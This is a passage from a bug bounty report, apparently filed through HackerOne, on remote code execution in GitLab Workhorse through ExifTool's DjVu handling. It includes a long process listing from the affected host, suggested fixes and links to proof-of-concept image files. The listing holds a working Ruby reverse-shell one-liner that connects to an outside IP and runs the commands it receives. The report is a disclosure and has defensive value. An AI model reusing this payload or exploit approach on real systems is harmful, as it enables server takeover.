?        S     2020  16:33 [ksoftirqd/6]  \nroot        48  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/6:0H]  \nroot        49  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/7]  \nroot        50  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/7]  \nroot        51  0.0  0.0      0     0 ?        S     2020   1:05 [migration/7]  \nroot        52  0.0  0.0      0     0 ?        S     2020  16:25 [ksoftirqd/7]  \nroot        54  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/7:0H]  \nroot        55  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/8]  \nroot        56  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/8]  \nroot        57  0.0  0.0      0     0 ?        S     2020   1:06 [migration/8]  \nroot        58  0.0  0.0      0     0 ?        S     2020  16:22 [ksoftirqd/8]  \nroot        60  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/8:0H]  \nroot        61  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/9]  \nroot        62  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/9]  \nroot        63  0.0  0.0      0     0 ?        S     2020   1:05 [migration/9]  \nroot        64  0.0  0.0      0     0 ?        S     2020  15:52 [ksoftirqd/9]  \nroot        66  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/9:0H]  \nroot        67  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/10]  \nroot        68  0.0  0.0      0     0 ?        S     2020   1:05 [watchdog/10]  \nroot        69  0.0  0.0      0     0 ?        S     2020   1:06 [migration/10]  \nroot        70  0.0  0.0      0     0 ?        S     2020  16:10 [ksoftirqd/10]  \nroot        72  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/10:0H]  \nroot        73  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/11]  \nroot        74  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/11]  \nroot        75  0.0  0.0      0     0 ?        S     2020   1:06 [migration/11]  \nroot        76  0.0  0.0      0     0 ?        S     2020  16:08 [ksoftirqd/11]  \nroot        78  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/11:0H]  \nroot        79  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/12]  \nroot        80  0.0  0.0      0     0 ?        S     2020   1:09 [watchdog/12]  \nroot        81  0.0  0.0      0     0 ?        S     2020   1:03 [migration/12]  \nroot        82  0.0  0.0      0     0 ?        S     2020  17:07 [ksoftirqd/12]  \nroot        84  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/12:0H]  \nroot        85  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/13]  \nroot        86  0.0  0.0      0     0 ?        S     2020   1:06 [watchdog/13]  \nroot        87  0.0  0.0      0     0 ?        S     2020   1:06 [migration/13]  \nroot        88  0.0  0.0      0     0 ?        S     2020  16:45 [ksoftirqd/13]  \nroot        90  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/13:0H]  \nroot        91  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/14]  \nroot        92  0.0  0.0      0     0 ?        S     2020   1:04 [watchdog/14]  \nroot        93  0.0  0.0      0     0 ?        S     2020   1:05 [migration/14]  \nroot        94  0.0  0.0      0     0 ?        S     2020  16:27 [ksoftirqd/14]  \nroot        96  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/14:0H]  \nroot        97  0.0  0.0      0     0 ?        S     2020   0:00 [cpuhp/15]  \nroot        98  0.0  0.0      0     0 ?        S     2020   1:07 [watchdog/15]  \nroot        99  0.0  0.0      0     0 ?        S     2020   1:07 [migration/15]  \nroot       100  0.0  0.0      0     0 ?        S     2020  16:35 [ksoftirqd/15]  \nroot       102  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/15:0H]  \nroot       103  0.0  0.0      0     0 ?        S     2020   0:00 [kdevtmpfs]  \nroot       104  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [netns]  \nroot       105  0.0  0.0      0     0 ?        S     2020   0:00 [rcu_tasks_kthre]  \nroot       106  0.0  0.0      0     0 ?        S     2020   0:00 [kauditd]  \nroot       110  0.0  0.0      0     0 ?        S     2020   0:33 [khungtaskd]  \nroot       111  0.0  0.0      0     0 ?        S     2020   0:11 [oom_reaper]  \nroot       112  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [writeback]  \nroot       113  0.0  0.0      0     0 ?        S     2020   0:51 [kcompactd0]  \nroot       114  0.0  0.0      0     0 ?        SN    2020   0:00 [ksmd]  \nroot       115  0.0  0.0      0     0 ?        SN    2020   3:10 [khugepaged]  \nroot       116  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [crypto]  \nroot       117  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kintegrityd]  \nroot       118  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kblockd]  \nroot       119  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ata_sff]  \nroot       120  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [md]  \nroot       121  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [edac-poller]  \nroot       122  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [devfreq_wq]  \nroot       123  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [watchdogd]  \nroot       127  0.0  0.0      0     0 ?        S     2020  76:51 [kswapd0]  \nroot       128  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kworker/u33:0]  \nroot       129  0.0  0.0      0     0 ?        S     2020   0:00 [ecryptfs-kthrea]  \nroot       172  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kthrotld]  \nroot       173  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [acpi_thermal_pm]  \nroot       174  0.0  0.0      0     0 ?        S     2020   0:00 [scsi_eh_0]  \nroot       175  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [scsi_tmf_0]  \nroot       183  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ipv6_addrconf]  \nroot       195  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [kstrp]  \nroot       212  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [charger_manager]  \nroot       406  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [raid5wq]  \nroot       454  0.0  0.0      0     0 ?        S     2020  10:42 [jbd2/sda1-8]  \nroot       455  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ext4-rsv-conver]  \nroot       515  0.0  0.0      0     0 ?        I\u003c    2020  11:09 [kworker/12:1H]  \nroot       522  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [iscsi_eh]  \nroot       525  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ib-comp-wq]  \nroot       526  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ib-comp-unb-wq]  \nroot       527  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ib_mcast]  \nroot       528  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ib_nl_sa_wq]  \nroot       531  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [rdma_cm]  \nroot       542  0.0  0.0      0     0 ?        I\u003c    2020  10:56 [kworker/6:1H]  \nroot       549  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [rpciod]  \nroot       550  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [xprtiod]  \nroot       565  0.0  0.0 102968   824 ?        Ss    2020   0:00 /sbin/lvmetad -f  \nroot       595  0.0  0.0  42604  3368 ?        Ss    2020   2:12 /lib/systemd/systemd-udevd  \nroot       596  0.0  0.0  12204  4680 ?        Ss    2020 451:18 /usr/sbin/haveged --Foreground --verbose=1 -w 1024  \nroot       597  0.0  0.0  97900 38924 ?        Ss    2020 113:30 /lib/systemd/systemd-journald  \nroot       763  0.0  0.0      0     0 ?        S     2020   0:00 [hwrng]  \nroot       798  0.0  0.0      0     0 ?        I\u003c    2020   1:33 [kworker/13:1H]  \nroot       814  0.0  0.0      0     0 ?        S     2020  12:32 [jbd2/sdb-8]  \nroot       815  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [ext4-rsv-conver]  \nprometh+   969  0.6  0.0 720896 31292 ?        Sl    2020 1997:39 /opt/prometheus/node_exporter/node_exporter --web.listen-address=:9100 --collector.mountstats --collector.nfs --collector.ntp --collector.textfile.directory=/opt/prometheus/node_exporter/metrics --collector.filesystem.ignored-fs-types=^(autofs|binfmt_misc|bpf|cgroup2?|configfs|debugfs|devpts|devtmpfs|fusectl|hugetlbfs|iso9660|mqueue|nfs.*|nsfs|overlay|proc|procfs|pstore|rpc_pipefs|securityfs|selinuxfs|squashfs|sysfs|tracefs)$ --collector.netstat.fields=^(.*_(InErrors|InErrs)|Ip_Forwarding|Ip(6|Ext)_(InOctets|OutOctets)|Icmp6?_(InMsgs|OutMsgs)|TcpExt_(Listen.*|Syncookies.*|TCPSynRetrans)|Tcp_(ActiveOpens|InSegs|OutSegs|OutRsts|PassiveOpens|RetransSegs|CurrEstab)|Udp6?_(InDatagrams|OutDatagrams|NoPorts|RcvbufErrors|SndbufErrors))$  \nroot      1224  0.0  0.0      0     0 ?        I\u003c    2020   1:36 [kworker/10:1H]  \nroot      1230  0.0  0.0  16124  2920 ?        Ss    2020   0:01 /sbin/dhclient -1 -v -pf /run/dhclient.ens4.pid -lf /var/lib/dhcp/dhclient.ens4.leases -I -df /var/lib/dhcp/dhclient6.ens4.leases ens4  \nroot      1386  0.0  0.0   5220   112 ?        Ss    2020   6:09 /sbin/iscsid  \nroot      1389  0.0  0.0   5720  3512 ?        S\u003cLs  2020  29:44 /sbin/iscsid  \nroot      1407  0.0  0.0 382660   408 ?        Ssl   2020   3:07 /usr/bin/lxcfs /var/lib/lxcfs/  \nroot      1426  0.0  0.0  27728  2320 ?        Ss    2020   3:41 /usr/sbin/cron -f  \nsyslog    1446  0.0  0.0 256392  2112 ?        Ssl   2020  56:37 /usr/sbin/rsyslogd -n  \nroot      1476  0.0  0.0  28628  2648 ?        Ss    2020   0:51 /lib/systemd/systemd-logind  \nroot      1512  0.0  0.0   4396  1208 ?        Ss    2020   0:00 /usr/sbin/acpid  \ndaemon    1525  0.0  0.0  26044  1464 ?        Ss    2020   0:00 /usr/sbin/atd -f  \npostfix   1570  0.0  0.0  67476  4488 ?        S    12:40   0:00 pickup -l -t fifo -u  \nroot      1593  0.0  0.0   4392   904 ?        Ss    2020   7:41 runsvdir -P /etc/service log: /process HTTP/1.1\&quot; 200 153 - -\u003e /process 10.219.1.10 - - [07/Apr/2021:13:13:54 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u003e /process 10.219.1.9 - - [07/Apr/2021:13:13:58 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u003e /process 10.219.1.10 - - [07/Apr/2021:13:14:09 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u003e /process 10.219.1.9 - - [07/Apr/2021:13:14:13 UTC] \&quot;GET /process HTTP/1.1\&quot; 200 153 - -\u003e /process  \ngit       1594 50.1  2.0 2843912 1351680 ?     Sl   12:40  17:00 puma: cluster worker 0: 7369 [gitlab-puma-worker]  \nmessage+  1599  0.0  0.0  43028  3356 ?        Ss    2020   1:36 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation  \nroot      1615  0.0  0.0   4240  1200 ?        Ss    2020   0:26 runsv apt_metrics  \nroot      1617  0.0  0.0   4240  1104 ?        Ss    2020   0:03 runsv node_exporter  \nroot      1618  0.0  0.0   4240  1104 ?        Ss    2020   4:24 runsv ntpd_metrics  \nroot      1620  0.0  0.0   4240   380 ?        Ss    2020   0:00 runsv gitlab-monitor  \nroot      1621  0.0  0.0   4240   388 ?        Ss    2020   0:00 runsv mtail  \nroot      1623  0.0  0.0      0     0 ?        I\u003c    2020  15:18 [kworker/0:1H]  \nroot      1624  0.0  0.0   4384   252 ?        S     2020   0:04 svlogd -tt /var/log/mtail  \nroot      1625  0.0  0.0   4384   380 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_apt_metrics  \nroot      1626  0.0  0.0   4384   224 ?        S     2020   0:00 svlogd -tt /var/log/prometheus/node_exporter_ntpd_metrics  \nroot      1627  0.0  0.0   4384   236 ?        S     2020   0:02 svlogd -tt /var/log/prometheus/node_exporter  \nroot      1628  0.0  0.0   4384   240 ?        S     2020   0:00 svlogd -tt /var/log/gitlab-monitor  \nroot      1713  0.0  0.0  13372   908 ?        Ss    2020   0:02 /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog  \nroot      1716  0.0  0.0      0     0 ?        I\u003c    2020   0:46 [kworker/14:1H]  \nroot      1844  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [nfsiod]  \nroot      1850  0.0  0.0 277088  2224 ?        Ssl   2020   0:36 /usr/lib/policykit-1/polkitd --no-debug  \nroot      1878  0.0  0.0      0     0 ?        I\u003c    2020   5:54 [kworker/2:1H]  \nroot      2084  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:0]  \nroot      2095  0.0  0.0  65512  3084 ?        Ss    2020   0:04 /usr/sbin/sshd -D  \nroot      2102  0.0  0.0      0     0 ?        I\u003c    2020   2:31 [kworker/9:1H]  \nroot      2120  0.0  0.0      0     0 ?        I\u003c    2020   5:08 [kworker/3:1H]  \nroot      2138  0.0  0.0      0     0 ?        I\u003c    2020   0:31 [kworker/15:1H]  \nroot      2146  0.0  0.0      0     0 ?        I\u003c    2020  23:45 [kworker/1:1H]  \nroot      2151  0.0  0.0      0     0 ?        I\u003c    2020   0:40 [kworker/4:1H]  \nroot      2167  0.0  0.0  14656  1372 tty1     Ss+   2020   0:00 /sbin/agetty --noclear tty1 linux  \nroot      2177  0.0  0.0  14472  1556 ttyS0    Ss+   2020   0:00 /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220  \nntp       2204  0.0  0.0  40268  2576 ?        Ss    2020  21:06 /usr/sbin/ntpd -p /var/run/ntpd.pid -g -c /var/lib/ntp/ntp.conf.dhcp -u 112:116  \nroot      2270  0.0  0.0  67480 18788 ?        Ss    2020  17:03 /usr/bin/python3 /usr/bin/google_ip_forwarding_daemon  \nroot      2272  0.0  0.0  67220 16368 ?        Ss    2020  10:50 /usr/bin/python3 /usr/bin/google_clock_skew_daemon  \nroot      2402  0.0  0.0  65408  2460 ?        Ss    2020   1:05 /usr/lib/postfix/sbin/master  \npostfix   2411  0.0  0.0  67640  1988 ?        S     2020   0:23 qmgr -l -t fifo -u  \nroot      2571  0.0  0.0   4392   848 ?        Ss    2020   2:50 runsvdir -P /opt/gitlab/service log: ...........................................................................................................................................................................................................................................................................................................................................................................................................  \nroot      2618  0.0  0.0   4240  1104 ?        Ss    2020   0:01 runsv puma  \nroot      2621  0.0  0.0   4240  1192 ?        Ss    2020   0:05 runsv logrotate  \nroot      2623  0.0  0.0   4240  1144 ?        Ss    2020   0:00 runsv nginx  \nroot      2625  0.0  0.0   4240  1092 ?        Ss    2020   0:01 runsv gitlab-workhorse  \ngitlab-+  3150  0.0  0.0 754368 26924 ?        Sl   Feb17  35:28 /opt/ruby-2.7.0/bin/ruby /opt/gitlab-monitor/bin/gitlab-mon web -c /opt/gitlab-monitor/config/worker-config.yml  \nroot      3164  0.0  0.0      0     0 ?        I\u003c    2020   0:12 [kworker/11:1H]  \nroot      3211  0.2  0.0      0     0 ?        I    12:42   0:04 [kworker/u32:2]  \nroot      3222  0.0  0.0      0     0 ?        I\u003c    2020   0:15 [kworker/7:1H]  \nroot      3463  0.0  0.0      0     0 ?        I    10:35   0:00 [kworker/5:1]  \nroot      3511  0.0  0.0      0     0 ?        I    11:40   0:00 [kworker/12:0]  \nroot      4032  0.0  0.1 1571276 107596 ?      Ssl   2020 172:34 /opt/prometheus/ebpf_exporter/ebpf_exporter --web.listen-address=:9435 --config.file=/opt/prometheus/ebpf_exporter/config.yml  \nroot      4171  0.0  0.0   4376   640 ?        S    13:12   0:00 sleep 600  \nroot      4302  0.0  0.0      0     0 ?        I\u003c    2020   2:25 [kworker/5:1H]  \nroot      4391  0.0  0.0      0     0 ?        I\u003c    2020   0:14 [kworker/8:1H]  \nroot      4699  0.0  0.0      0     0 ?        I    11:09   0:00 [kworker/13:2]  \nroot      4812  0.0  0.0   4376   672 ?        S    13:13   0:00 sleep 60  \nroot      5375  0.0  0.0   4504   788 ?        Ss   13:13   0:00 /bin/sh /opt/gitlab/embedded/bin/gitlab-logrotate-wrapper  \nroot      5379  0.0  0.0   4376   748 ?        S    13:13   0:00 sleep 600  \ngit       5398 49.7  1.9 2661404 1274712 ?     Sl   12:44  14:43 puma: cluster worker 3: 7369 [gitlab-puma-worker]  \ngit       5544  1.3  0.0  45604 27664 ?        S    13:14   0:00 /usr/bin/perl -w /opt/gitlab/embedded/bin/exiftool -all= --IPTC:all --XMP-iptcExt:all -tagsFromFile @ -ResolutionUnit -XResolution -YResolution -YCbCrSubSampling -YCbCrPositioning -BitsPerSample -ImageHeight -ImageWidth -ImageSize -Copyright -CopyrightNotice -Orientation -  \ngit       5545  0.0  0.0      0     0 ?        Z    13:14   0:00 [sh] \u003cdefunct\u003e  \ngit       5551  0.0  0.0 105260 10840 ?        S    13:14   0:00 ruby -rsocket -e exit if fork;c=TCPSocket.new(\&quot;103.3.61.137\&quot;,12345);while(cmd=c.gets);IO.popen(cmd,\&quot;r\&quot;){|io|c.print io.read}end  \ngit       5667  0.0  0.0   4504   740 ?        S    13:14   0:00 sh -c ps auxww  \ngit       5668  0.0  0.0  34424  2864 ?        R    13:14   0:00 ps auxww  \nroot      5952  0.0  0.0      0     0 ?        I    00:24   0:00 [kworker/5:2]  \nroot      6812  0.0  0.0  54640  7080 ?        Ss   Mar08   0:00 nginx: master process /opt/gitlab/embedded/sbin/nginx -p /var/opt/gitlab/nginx  \ngitlab-+  6813  0.0  0.0  59476 12544 ?        S    Mar08  18:42 nginx: worker process  \ngitlab-+  6814  0.0  0.0  59380 13704 ?        S    Mar08  18:28 nginx: worker process  \ngitlab-+  6815  0.0  0.0  59504 13088 ?        S    Mar08  18:57 nginx: worker process  \ngitlab-+  6816  0.0  0.0  59456 13048 ?        S    Mar08  19:35 nginx: worker process  \ngitlab-+  6817  0.0  0.0  59468 13396 ?        S    Mar08  18:41 nginx: worker process  \ngitlab-+  6818  0.0  0.0  59508 13700 ?        S    Mar08  20:20 nginx: worker process  \ngitlab-+  6819  0.0  0.0  59492 13220 ?        S    Mar08  19:33 nginx: worker process  \ngitlab-+  6820  0.0  0.0  59460 13420 ?        S    Mar08  22:00 nginx: worker process  \ngitlab-+  6821  0.0  0.0  59508 13420 ?        S    Mar08  24:15 nginx: worker process  \ngitlab-+  6822  0.0  0.0  59500 13348 ?        S    Mar08  20:53 nginx: worker process  \ngitlab-+  6823  0.0  0.0  59660 13588 ?        S    Mar08  27:47 nginx: worker process  \ngitlab-+  6824  0.0  0.0  59972 14116 ?        S    Mar08  37:52 nginx: worker process  \ngitlab-+  6825  4.0  0.0  63940 18592 ?        S    Mar08 1788:21 nginx: worker process  \ngitlab-+  6826  1.9  0.0  61436 15808 ?        S    Mar08 854:41 nginx: worker process  \ngitlab-+  6827  0.1  0.0  60120 14564 ?        S    Mar08  79:52 nginx: worker process  \ngitlab-+  6828  0.8  0.0  62348 16532 ?        S    Mar08 351:59 nginx: worker process  \ngitlab-+  6829  0.0  0.0  54836  3732 ?        S    Mar08   0:08 nginx: cache manager process  \ngit       6952 17.6  0.1 1532460 109784 ?      Ssl  10:04  33:35 /opt/gitlab/embedded/bin/gitlab-workhorse -listenNetwork unix -listenUmask 0 -listenAddr /var/opt/gitlab/gitlab-workhorse/sockets/socket -authBackend http://localhost:8080 -authSocket /var/opt/gitlab/gitlab-rails/sockets/gitlab.socket -documentRoot /opt/gitlab/embedded/service/gitlab-rails/public -pprofListenAddr  -apiLimit 5 -apiQueueDuration 60s -apiQueueLimit 200 -prometheusListenAddr 0.0.0.0:9229 -secretPath /opt/gitlab/embedded/service/gitlab-rails/.gitlab_workhorse_secret -logFormat json -config config.toml  \ngit       7369 10.3  1.5 1859556 1033020 ?     Ssl  10:04  19:41 puma 5.1.1 (unix:///var/opt/gitlab/gitlab-rails/sockets/gitlab.socket,tcp://0.0.0.0:8080) [gitlab-puma-worker]  \nroot      7522  0.0  0.0      0     0 ?        I    10:04   0:00 [kworker/11:2]  \nroot      8263  0.0  0.0      0     0 ?        I    12:15   0:00 [kworker/14:0]  \nroot      8266  0.0  0.0      0     0 ?        I    08:19   0:00 [kworker/0:2]  \nroot      8581  0.1  0.0      0     0 ?        I    12:48   0:02 [kworker/u32:1]  \nroot      9122  0.0  0.0      0     0 ?        I    10:37   0:00 [kworker/8:0]  \ngit       9978 47.0  2.0 3182348 1362056 ?     Sl   11:43  42:45 puma: cluster worker 8: 7369 [gitlab-puma-worker]  \nconsul   10871  0.5  0.2 257480 143704 ?       Ssl   2020 2836:38 /opt/consul/1.7.2/consul agent -config-file=/etc/consul/consul.json -config-dir=/etc/consul/conf.d  \ngit      10980 51.1  1.8 2507012 1229264 ?     Sl   12:49  12:43 puma: cluster worker 2: 7369 [gitlab-puma-worker]  \ninfluxd+ 12182  0.0  0.0 188928  1044 ?        Ssl   2020   0:14 /usr/bin/influxdb-relay -config /etc/influxdb-relay/influxdb-relay.conf  \nroot     12322  0.0  0.0      0     0 ?        I    12:49   0:00 [kworker/11:1]  \nroot     12828  0.0  0.0   4384  1276 ?        S     2020   0:01 svlogd -tt /var/log/gitlab/puma  \nroot     12831  0.2  0.0   4384  1228 ?        S     2020 1318:06 svlogd /var/log/gitlab/gitlab-workhorse  \nroot     12853  0.0  0.0   4384  1260 ?        S     2020   0:02 svlogd -tt /var/log/gitlab/nginx  \nroot     12856  0.0  0.0   4384   340 ?        S     2020   0:00 svlogd -tt /var/log/gitlab/logrotate  \ngit      13196 48.0  2.1 2935068 1437312 ?     Sl   12:17  27:28 puma: cluster worker 10: 7369 [gitlab-puma-worker]  \nroot     13379  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/7:1]  \nroot     13382  0.0  0.0      0     0 ?        I    09:53   0:00 [kworker/10:1]  \nroot     13611  1.0  0.0 1740892 38864 ?       Ssl  Jan29 1042:19 /usr/bin/process-exporter --config.path /etc/process-exporter/chef-configured.yaml --web.listen-address=:9256 -threads=false -gather-smaps=false  \nroot     14478  0.0  0.0      0     0 ?        I    09:24   0:00 [kworker/2:0]  \ngit      17155 50.3  1.8 2541576 1218444 ?     Sl   12:50  11:50 puma: cluster worker 15: 7369 [gitlab-puma-worker]  \nroot     17904  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/2:2]  \ngit      21109 48.3  1.9 2572804 1258580 ?     Sl   12:55   9:17 puma: cluster worker 5: 7369 [gitlab-puma-worker]  \nroot     21296  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/8:1]  \nroot     21299  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/1:0]  \nroot     21301  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/7:0]  \nroot     21306  0.0  0.0      0     0 ?        I    10:52   0:00 [kworker/15:1]  \nroot     21376  0.0  0.0      0     0 ?        I    09:59   0:00 [kworker/9:0]  \ngit      21698 48.0  2.2 3093788 1459416 ?     Sl   12:26  23:00 puma: cluster worker 9: 7369 [gitlab-puma-worker]  \nroot     22003  0.2  0.0      0     0 ?        I    12:26   0:05 [kworker/u32:3]  \nroot     22131  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/9:2]  \nroot     22135  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/4:2]  \nroot     22142  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/12:3]  \nroot     22143  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/3:1]  \nroot     22144  0.0  0.0      0     0 ?        I    11:57   0:00 [kworker/13:0]  \nroot     22863  0.0  0.0 161112 54712 ?        Ssl  Jan18   0:15 /opt/chef/embedded/bin/ruby --disable-gems /usr/bin/chef-client -c /etc/chef/client.rb -i 1800 -s 300  \nroot     24237  0.0  0.0 288904 59208 ?        Sl   Mar10   6:50 /opt/td-agent/bin/ruby /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid  \nroot     24242 20.6  0.5 3044156 391860 ?      Sl   Mar10 8337:18 /opt/td-agent/bin/ruby -Eascii-8bit:ascii-8bit /opt/td-agent/bin/fluentd --log /var/log/td-agent/td-agent.log --daemon /var/run/td-agent/td-agent.pid --under-supervisor  \ngit      24253 51.3  2.0 2857244 1349560 ?     Sl   12:29  23:03 puma: cluster worker 13: 7369 [gitlab-puma-worker]  \nroot     24667  0.1  0.0      0     0 ?        I    11:29   0:11 [kworker/u32:4]  \nroot     24911  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/6:2]  \nroot     25156  0.2  0.0      0     0 ?        I    12:59   0:01 [kworker/u32:5]  \nroot     25516  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/1:1]  \ngit      25517 50.4  2.1 2870560 1443204 ?     Sl   12:30  21:58 puma: cluster worker 6: 7369 [gitlab-puma-worker]  \ngit      25521 49.9  1.8 2550792 1218900 ?     Sl   13:00   7:06 puma: cluster worker 4: 7369 [gitlab-puma-worker]  \nroot     25525  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/3:2]  \nroot     25527  0.0  0.0      0     0 ?        I    07:36   0:00 [kworker/15:2]  \nroot     26983  0.0  0.0      0     0 ?        I    Apr06   0:00 [kworker/10:2]  \nroot     27893  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [xfsalloc]  \nroot     27894  0.0  0.0      0     0 ?        I\u003c    2020   0:00 [xfs_mru_cache]  \ngit      28051 49.9  1.8 2635012 1248076 ?     Sl   13:03   5:34 puma: cluster worker 11: 7369 [gitlab-puma-worker]  \ngit      28140 50.3  2.1 2943756 1397844 ?     Sl   12:33  20:26 puma: cluster worker 14: 7369 [gitlab-puma-worker]  \ngit      29132 49.0  2.0 3164444 1367952 ?     Sl   12:05  33:39 puma: cluster worker 1: 7369 [gitlab-puma-worker]  \nroot     30224  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/14:1]  \nroot     30233  0.0  0.0      0     0 ?        I    06:02   0:00 [kworker/0:1]  \nroot     31940  0.0  0.0 278944 10648 ?        Ssl   2020   6:14 /usr/lib/accountsservice/accounts-daemon  \nroot     32135  0.1  0.0      0     0 ?        I    13:07   0:00 [kworker/u32:0]  \nroot     32388  0.0  0.0      0     0 ?        I    01:32   0:00 [kworker/4:0]  \nroot     32453  5.3  0.0 1774984 40780 ?       Sl    2020 13156:17 /opt/prometheus/mtail/mtail -progs /opt/prometheus/mtail/progs -logs /var/log/apt/term.log,/var/log/syslog,/var/log/td-agent/td-agent.log,/var/log/gitlab/gitlab-rails/*.log,/var/log/gitlab/unicorn/unicorn_stderr.log,/var/log/gitlab/unicorn/unicorn_stdout.log -logtostderr  \ngit      32635 49.4  2.1 3154204 1401116 ?     Sl   12:09  31:54 puma: cluster worker 12: 7369 [gitlab-puma-worker]  \ngit      32703 48.7  1.8 2402308 1195496 ?     Sl   13:08   3:01 puma: cluster worker 7: 7369 [gitlab-puma-worker]  \nexit  \n```\n\n\n#####  Impact  \n* Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file\n\n#####  Examples  \n![echo_vakzz.jpg.zip](https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip)  \n![reverse_shell.jpg.zip](https://h1.sec.gitlab.net/a/a5274bb7-df39-499a-9c7a-e8409144cf16/reverse_shell.jpg.zip)\n\n#####  What is the current *bug* behavior?  \nGitLab Workhorse will pass any file to ExifTool, greatly increasing the attack surface. The current bug is in the DjVu module of `ExifTool` which should ideally not ever be hit.\n\n#####  What is the expected *correct* behavior?  \n* There must be better ways of convert C escape sequences than using `eval`  \n* Only the TIFF and JPEG modules should be used  \n* GitLab Workhorse could check if the file is a valid TIFF of JPEG before passing it to ExifTool\n\n#####  Output of checks  \nThis bug happens on GitLab.com\n\n######  Results of GitLab environment info  \n```  \nSystem information  \nSystem:  \nProxy:\t\tno  \nCurrent User:\tgit  \nUsing RVM:\tno  \nRuby Version:\t2.7.2p137  \nGem Version:\t3.1.4  \nBundler Version:2.1.4  \nRake Version:\t13.0.3  \nRedis Version:\t6.0.10  \nGit Version:\t2.29.0  \nSidekiq Version:5.2.9  \nGo Version:\tunknown\n\nGitLab information  \nVersion:\t13.10.2-ee  \nRevision:\tcc4224220e6  \nDirectory:\t/opt/gitlab/embedded/service/gitlab-rails  \nDB Adapter:\tPostgreSQL  \nDB Version:\t12.6  \nURL:\t\thttp://192.168.0.127:9080  \nHTTP Clone URL:\thttp://192.168.0.127:9080/some-group/some-project.git  \nSSH Clone URL:\tgit@192.168.0.127:some-group/some-project.git  \nElasticsearch:\tno  \nGeo:\t\tno  \nUsing LDAP:\tno  \nUsing Omniauth:\tyes  \nOmniauth Providers:\n\nGitLab Shell  \nVersion:\t13.17.0  \nRepository storage paths:  \n- default: \t/var/opt/gitlab/git-data/repositories  \nGitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell  \nGit:\t\t/opt/gitlab/embedded/bin/git  \n```\n\n####  Impact\n\n* Anyone with the ability to upload an image that goes through the GitLab Workhorse could achieve RCE via a specially crafted file\n\n## Attachments\n\n**Warning:** Attachments received through HackerOne, please exercise caution!\n\n* [echo_vakzz.jpg.zip](https://h1.sec.gitlab.net/a/ddac72e9-51a3-4d02-9d53-1709f502cf71/echo_vakzz.jpg.zip)\n* 